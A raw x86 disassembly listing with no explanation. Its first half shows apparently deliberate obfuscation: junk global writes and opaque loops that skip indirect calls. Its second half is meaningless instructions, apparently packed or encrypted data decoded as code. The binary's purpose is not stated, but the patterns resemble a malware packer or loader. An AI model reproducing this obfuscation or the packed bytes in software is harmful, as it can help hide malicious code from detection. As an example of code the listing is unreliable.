  413fde:	sbb    DWORD PTR ds:0x42a2fa,0x42a2f6
  413fe8:	add    ecx,esi
  413fea:	mov    DWORD PTR ds:0x42a2ee,0x6562
  413ff4:	jmp    0x414004
  413ff9:	mov    dl,BYTE PTR [ebp-0x1]
  413ffc:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  414003:	inc    ecx
  414004:	mov    DWORD PTR ds:0x42a2de,0x1651
  41400e:	cmp    ecx,0x40
  414011:	jb     0x413ff9
  414017:	mov    DWORD PTR ds:0x42a2ce,0x1c
  414021:	cmp    DWORD PTR ds:0x42a2ce,0x0
  414028:	je     0x414081
  41402e:	cmp    DWORD PTR ds:0x42a2ce,0x5
  414035:	jbe    0x414081
  41403b:	jmp    0x414055
  414040:	push   0x5b36
  414045:	push   0x4291e3
  41404a:	push   0x429247
  41404f:	call   DWORD PTR ds:0x42a3b6
  414055:	cmp    DWORD PTR ds:0x42a2ce,0x6
  41405c:	jne    0x41406f
  414062:	mov    edx,DWORD PTR ds:0x42a2ce
  414068:	dec    edx
  414069:	mov    DWORD PTR ds:0x42a2ce,edx
  41406f:	mov    edx,DWORD PTR ds:0x42a2ce
  414075:	dec    edx
  414076:	mov    DWORD PTR ds:0x42a2ce,edx
  41407c:	jmp    0x414021
  414081:	mov    edx,DWORD PTR [ebp-0x18]
  414084:	and    DWORD PTR ds:0x42a272,0x42a2aa
  41408e:	xor    edx,eax
  414090:	add    DWORD PTR ds:0x42a2d6,0x7605
  41409a:	add    edx,esi
  41409c:	mov    DWORD PTR ds:0x42a2c2,0x2718
  4140a6:	jmp    0x414179
  4140ab:	mov    edi,DWORD PTR [ebp+0x8]
  4140ae:	add    DWORD PTR ds:0x42a2a2,0x1c2b
  4140b8:	mov    ecx,0x8a98
  4140bd:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4140c2:	and    DWORD PTR ds:0x42a26e,0x0
  4140cc:	jmp    0x4140de
  4140d1:	mov    edi,DWORD PTR ds:0x42a26e
  4140d7:	inc    edi
  4140d8:	mov    DWORD PTR ds:0x42a26e,edi
  4140de:	cmp    DWORD PTR ds:0x42a26e,0x1f
  4140e5:	jae    0x414112
  4140eb:	cmp    DWORD PTR ds:0x42a26e,0x20
  4140f2:	jbe    0x414112
  4140f8:	jmp    0x41410d
  4140fd:	push   0x42a2d6
  414102:	push   0x4291fd
  414107:	call   DWORD PTR ds:0x42a3f2
  41410d:	jmp    0x4140d1
  414112:	mov    edi,0x3b5a
  414117:	sbb    DWORD PTR ds:0x42a2f6,0x4902
  414121:	add    cx,di
  414124:	add    DWORD PTR ds:0x42a2ae,0x42a296
  41412e:	movzx  ecx,cx
  414131:	xor    DWORD PTR ds:0x42a29e,0x6377
  41413b:	mov    DWORD PTR [ebp-0xc],ecx
  41413e:	sbb    ecx,DWORD PTR ds:0x42a2f6
  414144:	mov    ecx,DWORD PTR [ebp+0x8]
  414147:	movzx  ecx,WORD PTR [ecx+edx*4]
  41414b:	or     DWORD PTR ds:0x42a2ca,0x42a276
  414155:	xor    ecx,0x8a98
  41415b:	add    ecx,edi
  41415d:	movzx  edi,WORD PTR ds:0x42a2ea
  414164:	mov    edi,DWORD PTR [ebp-0xc]
  414167:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41416e:	mov    DWORD PTR ds:0x42a2c6,0x2666
  414178:	inc    edx
  414179:	mov    DWORD PTR ds:0x42a2d6,edi
  41417f:	mov    ecx,DWORD PTR [ebp-0x10]
  414182:	mov    DWORD PTR ds:0x42a2be,0x12d3
  41418c:	cmp    edx,ecx
  41418e:	mov    DWORD PTR ds:0x42a2de,0x4c7d
  414198:	jne    0x4140ab
  41419e:	or     edx,ecx
  4141a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4141a3:	and    DWORD PTR ds:0x42a2e6,0x0
  4141ad:	xor    edi,edi
  4141af:	add    edi,DWORD PTR ds:0x42a2e6
  4141b5:	inc    edi
  4141b6:	mov    DWORD PTR ds:0x42a2e6,edi
  4141bc:	cmp    DWORD PTR ds:0x42a2e6,0x2b
  4141c3:	jl     0x4141eb
  4141c9:	jmp    0x4141de
  4141ce:	push   0x42919f
  4141d3:	push   0x400000
  4141d8:	call   DWORD PTR ds:0x42a3ba
  4141de:	cmp    DWORD PTR ds:0x42a2e6,0x1b
  4141e5:	jb     0x4141ad
  4141eb:	mov    edx,DWORD PTR [ebp+0x10]
  4141ee:	mov    edi,DWORD PTR ds:0x42a27e
  4141f4:	sub    DWORD PTR ds:0x42a2f6,edi
  4141fa:	xor    ecx,eax
  4141fc:	and    edi,0x65ef
  414202:	add    ecx,esi
  414204:	adc    DWORD PTR ds:0x42a25e,0x5774
  41420e:	mov    DWORD PTR [edx],ecx
  414210:	mov    ecx,DWORD PTR [ebp-0x18]
  414213:	xor    ecx,eax
  414215:	add    ecx,esi
  414217:	mov    DWORD PTR ds:0x42a262,0x13
  414221:	cmp    DWORD PTR ds:0x42a262,0x0
  414228:	je     0x41426c
  41422e:	cmp    DWORD PTR ds:0x42a262,0x19
  414235:	jle    0x41426c
  41423b:	jmp    0x414258
  414240:	push   0x34ab
  414245:	push   0x42a2d2
  41424a:	push   DWORD PTR [ebp-0x14]
  41424d:	push   0x8eb1
  414252:	call   DWORD PTR ds:0x42a3f6
  414258:	xor    edi,edi
  41425a:	xor    edi,DWORD PTR ds:0x42a262
  414260:	dec    edi
  414261:	mov    DWORD PTR ds:0x42a262,edi
  414267:	jmp    0x414221
  41426c:	mov    DWORD PTR [ebp-0xc],ecx
  41426f:	mov    DWORD PTR ds:0x42a25a,0x1f
  414279:	cmp    DWORD PTR ds:0x42a25a,0x0
  414280:	je     0x4142c0
  414286:	cmp    DWORD PTR ds:0x42a25a,0x28
  41428d:	ja     0x4142c0
  414293:	jmp    0x4142ae
  414298:	push   0x2e6d
  41429d:	push   DWORD PTR [ebp-0x1c]
  4142a0:	push   DWORD PTR [ebp-0x28]
  4142a3:	push   0x29af
  4142a8:	call   DWORD PTR ds:0x42a3be
  4142ae:	mov    edi,DWORD PTR ds:0x42a25a
  4142b4:	dec    edi
  4142b5:	mov    DWORD PTR ds:0x42a25a,edi
  4142bb:	jmp    0x414279
  4142c0:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4142c7:	neg    edi
  4142c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4142d0:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4142d7:	mov    ecx,DWORD PTR [ebp-0x14]
  4142da:	mov    DWORD PTR [ebp+0x8],ecx
  4142dd:	adc    DWORD PTR ds:0x42a28e,0xc59
  4142e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4142ea:	xor    DWORD PTR ds:0x42a2e6,ecx
  4142f0:	xor    ecx,eax
  4142f2:	add    ecx,esi
  4142f4:	mov    ecx,0x242ebc9
  4142f9:	mov    edi,DWORD PTR ds:0x42a29a
  4142ff:	mov    edi,0xf641bc8
  414304:	je     0x41b4b4
  41430a:	mov    ebx,DWORD PTR ds:0x42a256
  414310:	adc    DWORD PTR ds:0x42a25e,ebx
  414316:	mov    edx,DWORD PTR [ebp+0x8]
  414319:	and    DWORD PTR ds:0x42a2ae,0x0
  414323:	jmp    0x414337
  414328:	xor    ebx,ebx
  41432a:	add    ebx,DWORD PTR ds:0x42a2ae
  414330:	inc    ebx
  414331:	mov    DWORD PTR ds:0x42a2ae,ebx
  414337:	cmp    DWORD PTR ds:0x42a2ae,0x12
  41433e:	jae    0x414383
  414344:	cmp    DWORD PTR ds:0x42a2ae,0xc
  41434b:	jle    0x414383
  414351:	jmp    0x414362
  414356:	push   DWORD PTR [ebp-0xc]
  414359:	push   DWORD PTR [ebp-0x18]
  41435c:	call   DWORD PTR ds:0x42a3c2
  414362:	cmp    DWORD PTR ds:0x42a2ae,0xb
  414369:	jne    0x41437e
  41436f:	xor    ebx,ebx
  414371:	or     ebx,DWORD PTR ds:0x42a2ae
  414377:	inc    ebx
  414378:	mov    DWORD PTR ds:0x42a2ae,ebx
  41437e:	jmp    0x414328
  414383:	mov    ebx,DWORD PTR [ebp-0x8]
  414386:	xor    edx,eax
  414388:	adc    DWORD PTR ds:0x42a276,0x42a272
  414392:	xor    ebx,eax
  414394:	sub    edx,ebx
  414396:	sub    DWORD PTR ds:0x42a256,0x2df9
  4143a0:	sub    edx,esi
  4143a2:	and    DWORD PTR ds:0x42a27e,0x0
  4143ac:	jmp    0x4143be
  4143b1:	mov    ebx,DWORD PTR ds:0x42a27e
  4143b7:	inc    ebx
  4143b8:	mov    DWORD PTR ds:0x42a27e,ebx
  4143be:	cmp    DWORD PTR ds:0x42a27e,0x1e
  4143c5:	jae    0x414409
  4143cb:	cmp    DWORD PTR ds:0x42a27e,0x9
  4143d2:	jb     0x414409
  4143d8:	jmp    0x4143e8
  4143dd:	push   0x1065
  4143e2:	call   DWORD PTR ds:0x42a3c6
  4143e8:	cmp    DWORD PTR ds:0x42a27e,0x8
  4143ef:	jne    0x414404
  4143f5:	xor    ebx,ebx
  4143f7:	or     ebx,DWORD PTR ds:0x42a27e
  4143fd:	inc    ebx
  4143fe:	mov    DWORD PTR ds:0x42a27e,ebx
  414404:	jmp    0x4143b1
  414409:	xor    edx,eax
  41440b:	or     ebx,0x35b
  414411:	mov    DWORD PTR [ebp+0x8],edx
  414414:	xor    DWORD PTR ds:0x42a27a,0x56cb
  41441e:	mov    edx,DWORD PTR [ebp+0x8]
  414421:	mov    DWORD PTR ds:0x42a2b2,0x1c
  41442b:	cmp    DWORD PTR ds:0x42a2b2,0x0
  414432:	je     0x41446a
  414438:	cmp    DWORD PTR ds:0x42a2b2,0x1f
  41443f:	jl     0x41446a
  414445:	jmp    0x414458
  41444a:	push   DWORD PTR [ebp-0x18]
  41444d:	push   0x42a2e2
  414452:	call   DWORD PTR ds:0x42a3fa
  414458:	mov    ebx,DWORD PTR ds:0x42a2b2
  41445e:	dec    ebx
  41445f:	mov    DWORD PTR ds:0x42a2b2,ebx
  414465:	jmp    0x41442b
  41446a:	mov    ebx,DWORD PTR [ebp-0x58]
  41446d:	add    edx,0x5708fa
  414473:	sub    DWORD PTR ds:0x42a2ae,0x42a262
  41447d:	imul   edx,ebx
  414480:	movzx  ebx,WORD PTR ds:0x42a2b6
  414487:	sbb    DWORD PTR ds:0x42a2e2,ebx
  41448d:	mov    DWORD PTR [ebp-0x58],edx
  414490:	mov    edx,DWORD PTR [ebp+0x8]
  414493:	and    DWORD PTR ds:0x42a2de,0x0
  41449d:	xor    ebx,ebx
  41449f:	xor    ebx,DWORD PTR ds:0x42a2de
  4144a5:	inc    ebx
  4144a6:	mov    DWORD PTR ds:0x42a2de,ebx
  4144ac:	cmp    DWORD PTR ds:0x42a2de,0x7
  4144b3:	jl     0x4144f3
  4144b9:	jmp    0x4144cc
  4144be:	push   DWORD PTR [ebp-0x20]
  4144c1:	push   0x42a286
  4144c6:	call   DWORD PTR ds:0x42a40a
  4144cc:	cmp    DWORD PTR ds:0x42a2de,0x6
  4144d3:	jne    0x4144e6
  4144d9:	mov    ebx,DWORD PTR ds:0x42a2de
  4144df:	inc    ebx
  4144e0:	mov    DWORD PTR ds:0x42a2de,ebx
  4144e6:	cmp    DWORD PTR ds:0x42a2de,0x14
  4144ed:	jb     0x41449d
  4144f3:	mov    ebx,DWORD PTR [ebp-0x54]
  4144f6:	adc    DWORD PTR ds:0x42a296,0x1f0e
  414500:	add    edx,0x64f898
  414506:	sub    DWORD PTR ds:0x42a2aa,0x42a2d6
  414510:	or     edx,ebx
  414512:	and    DWORD PTR ds:0x42a2ca,0x0
  41451c:	mov    ebx,DWORD PTR ds:0x42a2ca
  414522:	inc    ebx
  414523:	mov    DWORD PTR ds:0x42a2ca,ebx
  414529:	cmp    DWORD PTR ds:0x42a2ca,0x22
  414530:	jb     0x414559
  414536:	jmp    0x41454c
  41453b:	push   DWORD PTR [ebp-0x1c]
  41453e:	push   DWORD PTR [ebp-0x1c]
  414541:	push   0x5112
  414546:	call   DWORD PTR ds:0x42a40e
  41454c:	cmp    DWORD PTR ds:0x42a2ca,0x19
  414553:	jb     0x41451c
  414559:	mov    DWORD PTR [ebp-0x54],edx
  41455c:	sbb    DWORD PTR ds:0x42a2a6,0x5e0b
  414566:	mov    edx,DWORD PTR [ebp+0x8]
  414569:	mov    ebx,DWORD PTR [ebp-0x50]
  41456c:	and    DWORD PTR ds:0x42a2fa,0x42a25e
  414576:	add    edx,ecx
  414578:	add    DWORD PTR ds:0x42a2ae,0x23c2
  414582:	xor    edx,ebx
  414584:	mov    DWORD PTR [ebp-0x50],edx
  414587:	sbb    edx,edx
  414589:	mov    edx,DWORD PTR [ebp+0x8]
  41458c:	add    ebx,DWORD PTR ds:0x42a2f6
  414592:	mov    ebx,DWORD PTR [ebp-0x4c]
  414595:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  41459f:	add    edx,edi
  4145a1:	and    edx,ebx
  4145a3:	mov    DWORD PTR [ebp-0x4c],edx
  4145a6:	and    DWORD PTR ds:0x42a2ee,0x0
  4145b0:	jmp    0x4145c2
  4145b5:	mov    edx,DWORD PTR ds:0x42a2ee
  4145bb:	inc    edx
  4145bc:	mov    DWORD PTR ds:0x42a2ee,edx
  4145c2:	cmp    DWORD PTR ds:0x42a2ee,0x1d
  4145c9:	jae    0x4145fc
  4145cf:	cmp    DWORD PTR ds:0x42a2ee,0x2d
  4145d6:	jbe    0x4145fc
  4145dc:	jmp    0x4145f7
  4145e1:	push   DWORD PTR [ebp-0x14]
  4145e4:	push   DWORD PTR [ebp-0x20]
  4145e7:	push   0x1476
  4145ec:	push   0x4291d1
  4145f1:	call   DWORD PTR ds:0x42a3ca
  4145f7:	jmp    0x4145b5
  4145fc:	mov    edx,DWORD PTR [ebp+0x8]
  4145ff:	mov    ebx,DWORD PTR [ebp-0x48]
  414602:	adc    DWORD PTR ds:0x42a29a,0x42a25e
  41460c:	lea    edx,[ebx+edx*1+0x241fcdf]
  414613:	adc    DWORD PTR ds:0x42a292,0x5ee0
  41461d:	mov    DWORD PTR [ebp-0x48],edx
  414620:	mov    edx,DWORD PTR [ebp+0x8]
  414623:	neg    ebx
  414625:	mov    ebx,0xfa5e1524
  41462a:	sub    ebx,edx
  41462c:	add    ebx,DWORD PTR [ebp-0x44]
  41462f:	mov    DWORD PTR [ebp-0x44],ebx
  414632:	mov    edx,DWORD PTR ds:0x42a36a
  414638:	mov    edx,DWORD PTR [edx]
  41463a:	and    DWORD PTR ds:0x42a2fa,edx
  414640:	mov    edx,DWORD PTR [ebp+0x8]
  414643:	xor    edx,eax
  414645:	mov    DWORD PTR ds:0x42a2f6,0x6c5b
  41464f:	add    edx,esi
  414651:	jne    0x41430a
  414657:	jmp    0x41b4b4
  41465c:	sub    DWORD PTR ds:0x42a286,0x1976
  414666:	mov    edx,DWORD PTR [ebp-0xc]
  414669:	and    DWORD PTR ds:0x42a2f6,0x0
  414673:	jmp    0x414685
  414678:	mov    ebx,DWORD PTR ds:0x42a2f6
  41467e:	inc    ebx
  41467f:	mov    DWORD PTR ds:0x42a2f6,ebx
  414685:	cmp    DWORD PTR ds:0x42a2f6,0x16
  41468c:	jae    0x4146bc
  414692:	cmp    DWORD PTR ds:0x42a2f6,0x26
  414699:	ja     0x4146bc
  41469f:	jmp    0x4146b7
  4146a4:	push   0x71cf
  4146a9:	push   DWORD PTR [ebp-0x24]
  4146ac:	push   0x8216
  4146b1:	call   DWORD PTR ds:0x42a412
  4146b7:	jmp    0x414678
  4146bc:	sub    edx,esi
  4146be:	xor    ebx,DWORD PTR ds:0x42a296
  4146c4:	xor    edx,eax
  4146c6:	sub    DWORD PTR ds:0x42a292,edx
  4146cc:	mov    DWORD PTR [ebp-0x5c],edx
  4146cf:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  4146d9:	mov    edx,DWORD PTR [ebp-0x10]
  4146dc:	mov    ebx,DWORD PTR [ebp-0x8]
  4146df:	mov    DWORD PTR ds:0x42a2a6,0x1dc1
  4146e9:	xor    edx,eax
  4146eb:	and    DWORD PTR ds:0x42a2f2,0x42a2aa
  4146f5:	xor    ebx,eax
  4146f7:	sub    edx,ebx
  4146f9:	or     DWORD PTR ds:0x42a2a2,0x5c58
  414703:	sub    edx,esi
  414705:	xor    DWORD PTR ds:0x42a2ee,0x42a272
  41470f:	xor    edx,eax
  414711:	mov    DWORD PTR ds:0x42a2c6,0x43a7
  41471b:	mov    DWORD PTR [ebp-0x10],edx
  41471e:	mov    edx,DWORD PTR [ebp-0x14]
  414721:	mov    DWORD PTR ds:0x42a27a,0x5a8e
  41472b:	mov    DWORD PTR [ebp+0x8],edx
  41472e:	jmp    0x416bda
  414733:	and    DWORD PTR ds:0x42a262,0x0
  41473d:	xor    edx,edx
  41473f:	or     edx,DWORD PTR ds:0x42a262
  414745:	inc    edx
  414746:	mov    DWORD PTR ds:0x42a262,edx
  41474c:	cmp    DWORD PTR ds:0x42a262,0xb
  414753:	jge    0x4147a6
  414759:	jmp    0x41477f
  41475e:	push   0x42a28a
  414763:	push   DWORD PTR [ebp-0x18]
  414766:	push   DWORD PTR [ebp-0x14]
  414769:	push   0x686f
  41476e:	push   0x7e68
  414773:	push   DWORD PTR [ebp-0x1c]
  414776:	push   DWORD PTR [ebp-0x14]
  414779:	call   DWORD PTR ds:0x42a3ce
  41477f:	cmp    DWORD PTR ds:0x42a262,0xa
  414786:	jne    0x414799
  41478c:	mov    edx,DWORD PTR ds:0x42a262
  414792:	inc    edx
  414793:	mov    DWORD PTR ds:0x42a262,edx
  414799:	cmp    DWORD PTR ds:0x42a262,0x18
  4147a0:	jb     0x41473d
  4147a6:	mov    edx,DWORD PTR [ebp+0x8]
  4147a9:	adc    DWORD PTR ds:0x42a2e2,edi
  4147af:	mov    ebx,DWORD PTR [ebp-0x8]
  4147b2:	adc    DWORD PTR ds:0x42a25e,0x42a292
  4147bc:	xor    edx,eax
  4147be:	add    DWORD PTR ds:0x42a29e,0x4f03
  4147c8:	xor    ebx,eax
  4147ca:	sbb    DWORD PTR ds:0x42a2e2,0x7f15
  4147d4:	sub    edx,ebx
  4147d6:	and    DWORD PTR ds:0x42a2d2,0x0
  4147e0:	mov    ebx,DWORD PTR ds:0x42a2d2
  4147e6:	inc    ebx
  4147e7:	mov    DWORD PTR ds:0x42a2d2,ebx
  4147ed:	cmp    DWORD PTR ds:0x42a2d2,0x21
  4147f4:	jle    0x414817
  4147fa:	jmp    0x41480a
  4147ff:	push   0x5080
  414804:	call   DWORD PTR ds:0x42a3d6
  41480a:	cmp    DWORD PTR ds:0x42a2d2,0x1a
  414811:	jb     0x4147e0
  414817:	sub    edx,esi
  414819:	xor    edx,eax
  41481b:	mov    DWORD PTR [ebp+0x8],edx
  41481e:	mov    edx,DWORD PTR [ebp+0x8]
  414821:	mov    ebx,DWORD PTR [ebp-0x58]
  414824:	add    edx,0x5708fa
  41482a:	imul   edx,ebx
  41482d:	mov    DWORD PTR [ebp-0x58],edx
  414830:	mov    edx,DWORD PTR [ebp+0x8]
  414833:	mov    ebx,DWORD PTR [ebp-0x54]
  414836:	add    edx,0x64f898
  41483c:	or     edx,ebx
  41483e:	mov    DWORD PTR [ebp-0x54],edx
  414841:	mov    edx,DWORD PTR [ebp+0x8]
  414844:	mov    ebx,DWORD PTR [ebp-0x50]
  414847:	add    edx,ecx
  414849:	xor    edx,ebx
  41484b:	mov    DWORD PTR [ebp-0x50],edx
  41484e:	mov    edx,DWORD PTR [ebp+0x8]
  414851:	mov    ebx,DWORD PTR [ebp-0x4c]
  414854:	add    edx,edi
  414856:	and    edx,ebx
  414858:	mov    DWORD PTR [ebp-0x4c],edx
  41485b:	mov    edx,DWORD PTR [ebp+0x8]
  41485e:	mov    ebx,DWORD PTR [ebp-0x48]
  414861:	lea    edx,[ebx+edx*1+0x241fcdf]
  414868:	mov    DWORD PTR [ebp-0x48],edx
  41486b:	mov    edx,DWORD PTR [ebp+0x8]
  41486e:	mov    ebx,0xfa5e1524
  414873:	sub    ebx,edx
  414875:	add    ebx,DWORD PTR [ebp-0x44]
  414878:	mov    DWORD PTR [ebp-0x44],ebx
  41487b:	jmp    0x416bda
  414880:	inc    esp
  414881:	arpl   WORD PTR [esi+esi*8],di
  414884:	and    al,0x96
  414886:	xchg   ch,cl
  414888:	sahf   
  414889:	pushf  
  41488a:	ja     0x41486e
  41488c:	jnp    0x414881
  41488e:	inc    eax
  41488f:	jmp    0x83bdaf4b
  414894:	cmp    eax,0x3d83835e
  414899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41489a:	adc    DWORD PTR [ecx-0x4670fa80],0x42
  4148a1:	inc    esi
  4148a2:	push   ecx
  4148a3:	iret   
  4148a4:	jmp    0xc6dae542
  4148a9:	mov    WORD PTR [eax+ebp*1],ss
  4148ac:	xchg   ebx,eax
  4148ad:	out    dx,eax
  4148ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148af:	adc    ch,BYTE PTR [ebp+0x54]
  4148b2:	aad    0x12
  4148b4:	xchg   ah,ah
  4148b6:	xor    ecx,DWORD PTR [eax]
  4148b8:	cmp    BYTE PTR [edx+esi*8-0x3f7a817d],bl
  4148bf:	cmc    
  4148c0:	and    esp,ebx
  4148c2:	lea    edx,[ebx]
  4148c4:	sub    ch,ah
  4148c6:	(bad)  [edi+0x34]
  4148c9:	add    eax,0xf1dedccc
  4148ce:	mov    al,0xff
  4148d0:	add    al,0x57
  4148d2:	shl    DWORD PTR [edx-0x10],0x92
  4148d6:	sbb    eax,0x374e8282
  4148db:	lds    ecx,FWORD PTR [edi+0x1815b1b9]
  4148e1:	outs   dx,DWORD PTR ds:[esi]
  4148e2:	dec    edi
  4148e3:	popa   
  4148e4:	pop    esi
  4148e5:	mov    dh,0xe
  4148e7:	sub    al,0x4f
  4148e9:	mov    ah,0x84
  4148eb:	loopne 0x4148bc
  4148ed:	sub    esp,DWORD PTR [edx+0x40]
  4148f0:	out    dx,eax
  4148f1:	mov    al,0xf7
  4148f3:	(bad)  
  4148f4:	in     al,0x37
  4148f6:	dec    ecx
  4148f7:	cmp    edi,edi
  4148f9:	pushf  
  4148fa:	push   ecx
  4148fb:	sbb    DWORD PTR [edx-0x2c4640c9],ecx
  414901:	sbb    BYTE PTR [ecx+0x46296881],bh
  414907:	sub    BYTE PTR [ebx-0x3f],bl
  41490a:	jnp    0x414983
  41490c:	xchg   DWORD PTR [esp+ecx*4-0x41],edx
  414910:	mov    esi,0x61cbdc65
  414916:	sbb    eax,0x7a04ef3
  41491b:	sbb    DWORD PTR [ebx+0x28e30cc0],edi
  414921:	test   bh,bh
  414923:	pop    ebp
  414924:	lods   eax,DWORD PTR ds:[esi]
  414925:	xchg   BYTE PTR [edi],al
  414927:	idiv   bh
  414929:	mov    ds:0xc8cf0472,al
  41492e:	xchg   DWORD PTR [edi],esi
  414930:	das    
  414931:	nop
  414932:	mov    ebx,0xc848675d
  414937:	pop    esp
  414938:	or     al,0x5e
  41493a:	loop   0x41495b
  41493c:	stos   BYTE PTR es:[edi],al
  41493d:	xchg   DWORD PTR [ebx-0x41f74c8c],edx
  414943:	enter  0x8325,0x94
  414947:	mov    ecx,0x6c457b43
  41494c:	mov    esp,0x497464c5
  414951:	retf   0x71fd
  414954:	shr    BYTE PTR [edi+0x2e],0x7e
  414958:	mov    edx,0xa75e5ef4
  41495d:	push   ebp
  41495e:	mov    esi,0x76816b53
  414963:	enter  0xd95e,0x40
  414967:	inc    ebp
  414968:	xchg   edx,eax
  414969:	jg     0x4149a2
  41496b:	fsub   DWORD PTR fs:[ebp+0x55]
  41496f:	mov    BYTE PTR [edi],al
  414971:	js     0x414910
  414973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414974:	test   eax,0x7b217ef5
  414979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41497a:	sbb    DWORD PTR [ecx+0x79102f6f],esi
  414980:	ins    BYTE PTR es:[edi],dx
  414981:	sub    eax,0xe5e72c8b
  414986:	jnp    0x414940
  414988:	mov    ecx,0x9b948e9c
  41498d:	xchg   esi,eax
  41498e:	mov    eax,0xd971b585
  414993:	addr16 ret 0xd403
  414997:	scas   al,BYTE PTR es:[di]
  414999:	out    0xf2,eax
  41499b:	pcmpeqw mm2,QWORD PTR [esi+eax*1]
  41499f:	xchg   edx,eax
  4149a0:	shr    ebp,cl
  4149a2:	ja     0x414945
  4149a4:	xor    ebx,eax
  4149a6:	xlat   BYTE PTR ds:[ebx]
  4149a7:	dec    esi
  4149a8:	jmp    0xa717486e
  4149ad:	or     edi,ebx
  4149af:	std    
  4149b0:	adc    eax,0x5a9fa2fe
  4149b5:	lods   eax,DWORD PTR ds:[esi]
  4149b6:	mov    BYTE PTR ds:0x82fbc251,bl
  4149bc:	xor    eax,0xfa563f21
  4149c1:	aaa    
  4149c2:	mov    dl,0x44
  4149c4:	sub    DWORD PTR [ecx],ecx
  4149c6:	lahf   
  4149c7:	bound  ebx,QWORD PTR [eax-0x37]
  4149ca:	pop    ebp
  4149cb:	stos   DWORD PTR es:[edi],eax
  4149cc:	inc    ebp
  4149cd:	pop    ss
  4149ce:	push   ds
  4149cf:	cwde   
  4149d0:	or     ch,dl
  4149d2:	imul   esi,ebp,0xf99f0250
  4149d8:	call   0x98586711
  4149dd:	jmp    0x1d99:0x15cf5406
  4149e4:	ins    DWORD PTR es:[edi],dx
  4149e5:	adc    esi,DWORD PTR [ecx-0x569a1307]
  4149eb:	xchg   ebp,eax
  4149ec:	jnp    0x414a24
  4149ee:	pop    ebx
  4149ef:	jne    0x414981
  4149f1:	jo     0x4149c3
  4149f3:	mov    ebx,DWORD PTR [ebp-0x358c03a1]
  4149f9:	(bad)  
  4149fa:	jge    0x414993
  4149fc:	inc    ebp
  4149fd:	loopne 0x414a4c
  4149ff:	dec    eax
  414a00:	jnp    0x414997
  414a02:	les    ebp,FWORD PTR [edx-0x70]
  414a05:	stos   DWORD PTR es:[edi],eax
  414a06:	repnz push eax
  414a08:	push   0x4d64e826
  414a0d:	div    DWORD PTR [ebx+0x109c5550]
  414a13:	or     al,0xb6
  414a15:	les    edi,FWORD PTR [eax+0x57]
  414a18:	sbb    al,0x7a
  414a1a:	and    ecx,DWORD PTR [ebx]
  414a1c:	test   DWORD PTR [edi],eax
  414a1e:	mov    bh,0x8
  414a20:	ins    DWORD PTR es:[edi],dx
  414a21:	ror    al,0x14
  414a24:	xor    DWORD PTR [ebp+0x42c4657a],0x7364ef31
  414a2e:	mov    ah,0x4e
  414a30:	ror    DWORD PTR [ebx-0x31],cl
  414a33:	adc    BYTE PTR [ebp+0x1e199863],bl
  414a39:	mov    esp,?
  414a3b:	dec    edx
  414a3c:	xor    ecx,eax
  414a3e:	paddb  mm2,mm2
  414a41:	les    edi,FWORD PTR [edi-0x66]
  414a44:	jb     0x414a11
  414a46:	jb     0x414a40
  414a48:	fwait
  414a49:	sub    dl,al
  414a4b:	clc    
  414a4c:	pop    eax
  414a4d:	lods   al,BYTE PTR ds:[esi]
  414a4e:	in     al,0x35
  414a50:	xchg   esi,eax
  414a51:	sbb    DWORD PTR [ecx+0x46407406],esi
  414a57:	(bad)  
  414a58:	dec    ecx
  414a59:	outs   dx,BYTE PTR ds:[esi]
  414a5a:	nop
  414a5b:	mov    eax,ds:0x5831a8c9
  414a60:	lock es out 0xdd,al
  414a64:	shl    BYTE PTR [ecx],cl
  414a66:	(bad)  
  414a68:	cmp    cl,BYTE PTR [esi+0x0]
  414a6b:	xlat   BYTE PTR ds:[ebx]
  414a6c:	out    0x47,eax
  414a6e:	pop    ebx
  414a6f:	adc    DWORD PTR [edx+0x6185bb20],0x564098f7
  414a79:	pushf  
  414a7a:	loopne 0x414a0f
  414a7c:	call   0x767c1df1
  414a81:	cmp    DWORD PTR [esp+eiz*8],esp
  414a84:	mov    ds:0x76e8db66,al
  414a89:	mov    eax,ds:0xdc663bd4
  414a8e:	(bad)  
  414a8f:	jg     0x414ae4
  414a91:	hlt    
  414a92:	inc    esp
  414a93:	daa    
  414a94:	xlat   BYTE PTR ds:[ebx]
  414a95:	test   eax,0x84a86074
  414a9a:	stos   DWORD PTR es:[edi],eax
  414a9b:	stc    
  414a9c:	xchg   edx,eax
  414a9d:	jnp    0x414b15
  414a9f:	mov    esp,0xf32da7ac
  414aa4:	jge    0x414a2b
  414aa6:	cmp    esi,DWORD PTR [esp+edi*4+0x48a6c6c0]
  414aad:	(bad)  
  414aae:	pop    ds
  414aaf:	jle    0x414a9c
  414ab1:	popf   
  414ab2:	ins    DWORD PTR es:[edi],dx
  414ab3:	cdq    
  414ab4:	pop    ebp
  414ab5:	arpl   WORD PTR [ebp-0x30d88aaf],bx
  414abb:	data16 fldz 
  414abe:	push   edx
  414abf:	or     DWORD PTR [edi],0xffffffb7
  414ac2:	inc    esi
  414ac3:	xchg   ecx,eax
  414ac4:	pop    esp
  414ac5:	dec    BYTE PTR [eax-0xac8fa4]
  414acb:	iret   
  414acc:	and    BYTE PTR [ecx],dh
  414ace:	inc    eax
  414acf:	retf   
  414ad0:	add    ecx,0x82c34acc
  414ad6:	or     cl,BYTE PTR [eax]
  414ad8:	jp     0x414b34
  414ada:	iret   
  414adb:	jnp    0x414aff
  414add:	mov    cs,WORD PTR [ecx-0x3dcae9ec]
  414ae3:	ins    DWORD PTR es:[edi],dx
  414ae4:	fstp   TBYTE PTR [edi]
  414ae6:	pusha  
  414ae7:	aaa    
  414ae8:	xor    eax,0x4b60f292
  414aed:	push   esp
  414aee:	push   es
  414aef:	jge    0x414b60
  414af1:	loop   0x414ac6
  414af3:	(bad)  
  414af4:	ficom  WORD PTR [edx+edx*1+0x31d175d9]
  414afb:	mov    esi,0x559990fe
